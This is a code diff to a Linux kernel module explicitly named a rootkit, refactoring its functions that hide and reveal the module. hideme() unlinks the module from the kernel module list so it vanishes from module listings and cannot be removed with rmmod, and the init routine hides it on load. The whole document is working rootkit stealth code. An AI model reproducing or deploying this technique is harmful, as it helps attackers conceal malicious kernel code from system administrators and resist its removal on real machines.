@@ -12,30 +12,28 @@ static struct list_head *prev_module;
 static short hidden = 0;
 
 void showme(void) {
+    printk(KERN_INFO "showing rootkit\n");
     list_add(&THIS_MODULE->list, prev_module);
+    hidden = 0;
 }
 
 void hideme(void) {
+    printk(KERN_INFO "hiding rootkit\n");
     prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
+    hidden = 1;
 }
 
 static int __init rootkit_init(void) {
     printk(KERN_INFO "rootkit Loaded\n");
-    printk(KERN_INFO "hide rootkit\n");
     hideme();
-    hidden = 1;
-    printk(KERN_INFO "show rootkit\n");
     showme();
-    hidden = 0;
-    printk(KERN_INFO "hide rootkit\n");
     hideme();
-    hidden = 1;
     return 0;
 }
 
 static void __exit rootkit_exit(void) {
-    // won't get here - rmmod will fail
+    // when module is hidden, won't exit - rmmod will fail
     printk(KERN_INFO "rootkit Unloaded\n");
 }
 
